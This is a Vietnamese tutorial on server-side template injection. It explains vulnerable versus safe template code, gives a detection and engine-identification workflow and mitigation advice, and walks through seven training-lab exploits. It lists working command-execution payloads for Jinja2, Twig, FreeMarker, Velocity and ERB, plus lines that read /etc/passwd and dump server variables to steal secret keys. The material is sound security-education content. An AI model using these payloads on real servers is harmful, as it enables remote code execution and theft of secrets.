# SERVER-SIDE TEMPLATE INJECTION (SSTI) — KIẾN THỨC TỔNG HỢP & STEP BY STEP

## Mục lục
1. [SSTI là gì?](#1-ssti-là-gì)
2. [Quy trình phát hiện & khai thác](#2-quy-trình-phát-hiện--khai-thác)
3. [Payload theo từng template engine](#3-payload-theo-từng-template-engine)
4. [Cách phòng chống](#4-cách-phòng-chống)
5. [Lab step-by-step](#5-lab-step-by-step)

## 1. SSTI là gì?

Xảy ra khi input người dùng được nhúng **trực tiếp vào template** (thay vì chỉ truyền như dữ liệu/biến) trước khi template engine render, khiến attacker chèn được cú pháp template thực thi biểu thức/code phía server — có thể dẫn tới Remote Code Execution.

**Dấu hiệu code dễ tổn thương (Python Jinja2):**
```python
# Không an toàn: input được nối trực tiếp vào chuỗi template
template = Template("Hello " + name + "!")
return template.render()
```
So với cách an toàn:
```python
# An toàn: input chỉ được truyền như biến (context), không phải 1 phần cú pháp template
template = Template("Hello {{name}}!")
return template.render(name=name)
```

## 2. Quy trình phát hiện & khai thác

**Bước 1 — Phát hiện:** gửi payload đặc biệt (không phải cú pháp HTML/JS thông thường) để phân biệt với XSS:
```
${{<%[%'"}}%\.
```
Nếu server trả lỗi liên quan tới cú pháp template (không phải lỗi HTML thông thường) → dấu hiệu SSTI.

**Bước 2 — Xác định template engine:** thử các biểu thức toán học đặc trưng của từng engine:
| Payload | Engine (nếu render ra `49`) |
|---|---|
| `${7*7}` | Nhiều engine dùng cú pháp `${}` (FreeMarker, Velocity đôi khi) |
| `{{7*7}}` | Jinja2, Twig |
| `{{7*'7'}}` | Nếu ra `7777777` (Python string repeat) → xác nhận Jinja2 (Twig sẽ báo lỗi hoặc ra `49`) |
| `#{7*7}` | JSP/EL, Thymeleaf (Spring) |
| `<%= 7*7 %>` | ERB (Ruby) |

**Bước 3 — Xây payload RCE:** dựa vào engine xác định được, dùng payload đặc thù để đọc/thực thi lệnh hệ thống (xem mục 3).

## 3. Payload theo từng template engine

**Jinja2 (Python/Flask):**
```
{{ config }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```
Payload RCE điển hình (dùng subclass `os._wrap_close` hoặc tương tự để lấy quyền truy cập `os`):
```
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
(`INDEX` cần dò tìm class phù hợp trong danh sách `__subclasses__()`, thường là `subprocess.Popen`.)

**Twig (PHP):**
```
{{7*7}}
{{ ['id']|filter('system') }}
{{ ['id',''] |sort('system') }}
```

**FreeMarker (Java):**
```
${7*7}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Velocity (Java):**
```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")
```

**Handlebars/ERB (Ruby):**
```
<%= system('id') %>
<%= `id` %>
```

## 4. Cách phòng chống

- Không bao giờ nhúng input người dùng trực tiếp vào **chuỗi template** — chỉ truyền qua context/biến để engine tự xử lý escape.
- Dùng chế độ "sandbox"/"logic-less" của template engine nếu phải render nội dung do người dùng cung cấp (ví dụ Jinja2 `SandboxedEnvironment`), dù sandbox vẫn có thể bị bypass trong 1 số trường hợp.
- Whitelist nghiêm ngặt cú pháp cho phép nếu bắt buộc phải cho user tự soạn template.
- Chạy tiến trình render template với quyền hạn tối thiểu.

## 5. Lab step-by-step

### Lab 1: Basic server-side template injection
**Mục tiêu:** Thực thi lệnh `id`/`cat` qua template ERB (Ruby).
- **B1:** Vào trang "message of the day", chỉnh sửa nội dung template (chức năng cho phép sửa template), thử payload phát hiện: `${{<%[%'"}}%\.` → gây lỗi cú pháp.
- **B2:** Xác định engine bằng payload toán học: `<%= 7*7 %>` → render ra `49` → xác nhận ERB (Ruby).
- **B3:** Payload RCE: `<%= system("id") %>` hoặc đọc file: `<%= File.open('/etc/passwd').read %>`.
- **B4:** Lưu template, xem trang hiển thị kết quả → lab solved.

### Lab 2: Basic server-side template injection (code context)
**Mục tiêu:** Injection point nằm trong 1 biểu thức code có sẵn (không phải plain text template), engine Freemarker.
- **B1:** Tìm tham số truyền vào 1 đoạn code template có sẵn dạng `${student.grade}` — injection point nằm ngay trong ngữ cảnh biểu thức, không cần mở `${}` mới.
- **B2:** Vì đã ở trong ngữ cảnh code, chỉ cần "thoát" khỏi biến gốc và chèn thêm biểu thức:
  ```
  .grade}"freemarker.template.utility.Execute"?new()("id")}
  ```
  (Payload cụ thể tuỳ theo cấu trúc thật của template — mục tiêu là đóng đúng ngữ cảnh hiện có rồi mở biểu thức thực thi mới.)
- **B3:** Gửi payload, quan sát kết quả lệnh `id` xuất hiện trong response → lab solved.

### Lab 3: Server-side template injection using documentation
**Mục tiêu:** Engine không quen thuộc — cần tra tài liệu chính thức để tìm cú pháp thực thi code.
- **B1:** Phát hiện SSTI, xác định tên engine qua thông báo lỗi (ví dụ lộ ra "Pebble" hoặc "Handlebars" trong stack trace).
- **B2:** Tra cứu tài liệu chính thức của engine đó để tìm cú pháp gọi method/thực thi lệnh hỗ trợ sẵn (ví dụ Pebble hỗ trợ gọi method Java trực tiếp qua cú pháp riêng).
- **B3:** Xây payload theo đúng cú pháp tài liệu, ví dụ (Pebble):
  ```
  {% set cmd = 'id' %}
  {{ cmd | dataUri }}
  ```
  hoặc dùng cú pháp gọi execute có sẵn theo tài liệu cụ thể của phiên bản engine.
- **B4:** Gửi payload, xác nhận lệnh thực thi thành công → lab solved.

### Lab 4: Server-side template injection in an unknown language with a documented exploit
**Mục tiêu:** Engine hiếm gặp hơn nữa — tìm payload public đã được công bố (ví dụ trên các CVE/blog bảo mật) thay vì tự viết từ tài liệu.
- **B1:** Xác định dấu hiệu ngôn ngữ/engine cụ thể qua lỗi hoặc hành vi đặc trưng.
- **B2:** Tìm kiếm payload RCE đã biết công khai cho engine đó (nhiều SSTI engine hiếm có sẵn payload mẫu được cộng đồng bảo mật công bố).
- **B3:** Áp dụng payload đã tìm được, điều chỉnh cho khớp với injection point cụ thể của lab.
- **B4:** Xác nhận lệnh thực thi thành công → lab solved.

### Lab 5: Server-side template injection with information disclosure via user-supplied objects
**Mục tiêu:** Không thể RCE trực tiếp, nhưng có thể đọc thông tin nhạy cảm (secret key) thông qua object context có sẵn trong template (Twig/PHP).
- **B1:** Xác định injection point Twig, thử `{{7*7}}` → xác nhận engine.
- **B2:** Vì payload thực thi lệnh hệ thống trực tiếp bị chặn (sandbox/filter), khai thác qua object có sẵn trong context template (ví dụ object request/app chứa config):
  ```
  {{app.request.server.all|join(',')}}
  ```
  hoặc dò các biến global có sẵn trong ngữ cảnh Twig để tìm secret key cấu hình ứng dụng.
- **B3:** Tìm được secret key (ví dụ dùng để ký session) trong output → dùng key đó để giả mạo dữ liệu khác (ví dụ ký lại cookie) → lab solved.

### Lab 6: Server-side template injection in a sandboxed environment
**Mục tiêu:** Engine chạy trong sandbox (Jinja2 `SandboxedEnvironment`) chặn truy cập trực tiếp `os`/`subprocess` — cần tìm cách bypass sandbox.
- **B1:** Thử payload RCE thông thường của Jinja2 → bị chặn bởi `SecurityError` (sandbox phát hiện truy cập attribute nguy hiểm).
- **B2:** Dò các class/attribute chưa bị sandbox chặn nhưng vẫn dẫn được tới hành vi nguy hiểm — dùng kỹ thuật duyệt qua `__subclasses__()` để tìm class không nằm trong danh sách bị cấm nhưng có thể lợi dụng gián tiếp (ví dụ class ghi log ra file, hoặc class có thể chuyển hướng import).
- **B3:** Xây payload chain qua nhiều bước để cuối cùng đạt được hành vi mong muốn (đọc file hoặc RCE) mà không đi qua attribute bị sandbox chặn trực tiếp.
- **B4:** Gửi payload đã bypass, xác nhận thành công → lab solved.

### Lab 7: Server-side template injection with a custom exploit
**Mục tiêu:** Được cung cấp mã nguồn ứng dụng — tự phân tích để viết payload SSTI hoàn toàn tuỳ biến (không có sẵn payload chuẩn cho cấu hình custom này).
- **B1:** Đọc mã nguồn được cung cấp, xác định chính xác template engine, cấu hình sandbox (nếu có), và các object/class có sẵn trong context.
- **B2:** Xác định injection point và ngữ cảnh chèn (plain text hay code context).
- **B3:** Dựa trên các class/method thực sự có sẵn trong classpath/context của ứng dụng (theo mã nguồn), tự thiết kế payload chain phù hợp dẫn tới RCE hoặc đọc dữ liệu nhạy cảm.
- **B4:** Test và tinh chỉnh payload qua Burp Repeater cho tới khi đạt được kết quả mong muốn → lab solved.

## Tổng kết
- Luôn thực hiện đúng quy trình: phát hiện (payload đa ký tự đặc biệt) → xác định engine (payload toán học) → tra payload RCE tương ứng.
- Khi injection point nằm trong "code context" có sẵn (không phải plain text), cần "thoát" đúng cú pháp hiện có trước khi chèn payload mới.
- Với engine hiếm/custom, kỹ năng đọc tài liệu chính thức và mã nguồn ứng dụng là bắt buộc — không có payload sẵn cho mọi trường hợp.

